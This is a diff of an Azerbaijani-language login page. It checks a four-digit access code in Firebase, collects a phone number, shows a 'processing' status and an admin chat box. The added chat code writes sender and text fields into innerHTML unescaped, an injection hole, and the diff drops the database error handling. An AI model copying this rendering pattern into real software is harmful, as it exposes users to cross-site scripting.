@@ -2,56 +2,87 @@
 <html lang="az">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Girişi</title>
     <style>
         body {
-            background-color: #0b0b0b;
+            background-color: #080808;
             color: #fff;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
         .neon-box {
-            background: #111;
+            background: #121212;
             border: 2px solid #00ffcc;
-            box-shadow: 0 0 20px #00ffcc;
-            padding: 30px;
-            border-radius: 12px;
-            width: 320px;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
+            padding: 35px;
+            border-radius: 15px;
+            width: 360px;
             text-align: center;
+            box-sizing: border-box;
+        }
+        h2 {
+            color: #00ffcc;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
         }
         input, select {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin: 10px 0;
-            background: #222;
+            background: #1a1a1a;
             border: 1px solid #00ffcc;
             color: #fff;
-            border-radius: 5px;
+            border-radius: 8px;
             box-sizing: border-box;
+            outline: none;
+            font-size: 14px;
         }
         button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background: #00ffcc;
             color: #000;
             font-weight: bold;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             margin-top: 10px;
+            font-size: 15px;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
         }
         button:disabled {
-            background: #555;
+            background: #333;
+            color: #666;
             cursor: not-allowed;
+            box-shadow: none;
         }
         .warning {
             font-size: 11px;
             color: #ff4444;
-            margin-top: 10px;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+        #statusMsg {
+            font-size: 15px;
+            font-weight: bold;
+            color: #00ffcc;
+            margin-top: 15px;
+            text-shadow: 0 0 8px rgba(0, 255, 204, 0.4);
+        }
+        .chat-box {
+            margin-top: 15px;
+            text-align: left;
+            border-top: 1px solid #333;
+            padding-top: 10px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-size: 13px;
         }
     </style>
 </head>
@@ -59,12 +90,15 @@
 
     <div class="neon-box">
         <h2>Sistem Girişi</h2>
+        
+        <!-- 1-ci Addım: Kod -->
         <div id="step1">
-            <input type="text" id="accessCode" placeholder="4 rəqəmli kod" maxlength="4">
+            <input type="text" id="accessCode" placeholder="4 rəqəmli kodu daxil edin" maxlength="4">
             <button onclick="checkCode()">Daxil ol</button>
             <p class="warning">Bu kodu başqasına versəz hesab banlanacaq!</p>
         </div>
 
+        <!-- 2-ci Addım: Nömrə və Müraciət -->
         <div id="step2" style="display:none;">
             <select id="countryCode">
                 <option value="">Ölkə kodu seçin</option>
@@ -72,9 +106,16 @@
                 <option value="+90">+90 (Türkiyə)</option>
                 <option value="+7">+7 (Rusiya)</option>
             </select>
-            <input type="text" id="phoneNumber" placeholder="Nömrə (məs: 501234567)" oninput="validateForm()">
+            <input type="text" id="phoneNumber" placeholder="Nömrəni daxil edin" oninput="validateForm()">
             <button id="startBtn" onclick="submitData()" disabled>İşləmə başla</button>
-            <p id="statusMsg" style="color: #00ffcc; margin-top: 15px;"></p>
+            <p id="statusMsg"></p>
+
+            <!-- Admindən gələn mesajlar / cavablar -->
+            <div id="adminResponseArea" style="display:none;">
+                <div class="chat-box" id="chatMessages">
+                    <p style="color: #888;">Admindən cavab gözlənilir...</p>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -101,7 +142,7 @@
                 const data = snapshot.val();
                 if (data) {
                     if (data.banned || data.active === false) {
-                        alert("Bu kod banlanıb və ya qüvvədən düşüb!");
+                        alert("Bu kod banlanıb və ya etibarsızdır!");
                         return;
                     }
                     currentCode = code;
@@ -110,9 +151,6 @@
                 } else {
                     alert("Yanlış və ya mövcud olmayan kod!");
                 }
-            }, error => {
-                console.error(error);
-                alert("Baza bağlantısında xəta baş verdi.");
             });
         }
 
@@ -134,16 +172,39 @@
         function submitData() {
             const fullPhone = countrySelect.value + phoneInput.value.trim();
             
+            // Sorğunu və nömrəni Firebase-ə yazırıq (Admin görəcək)
             db.ref("requests/" + currentCode).set({
                 code: currentCode,
                 phone: fullPhone,
                 timestamp: Date.now()
             });
 
+            // Kurs tələbinə uyğun olaraq ekran "işləm aparılır" yazısında qalır
             startBtn.disabled = true;
             countrySelect.disabled = true;
             phoneInput.disabled = true;
-            document.getElementById("statusMsg").innerText = "İşlem aparılır...";
+            document.getElementById("statusMsg").innerText = "İşləm aparılır...";
+            document.getElementById("adminResponseArea").style.display = "block";
+
+            // Admindən gələn cavabları dinləyirik
+            db.ref("chats/" + currentCode).on("value", snapshot => {
+                const chatDiv = document.getElementById("chatMessages");
+                chatDiv.innerHTML = "";
+                if (snapshot.exists()) {
+                    snapshot.forEach(child => {
+                        const msg = child.val();
+                        chatDiv.innerHTML += `<p><b>${msg.sender}:</b> ${msg.text}</p>`;
+                    });
+                }
+            });
+
+            // Ban statusunu yoxla (əgər admin banlasa)
+            db.ref("codes/" + currentCode + "/banned").on("value", snapshot => {
+                if (snapshot.val() === true) {
+                    alert("Hesabınız banlandı!");
+                    location.reload();
+                }
+            });
         }
     </script>
 </body>
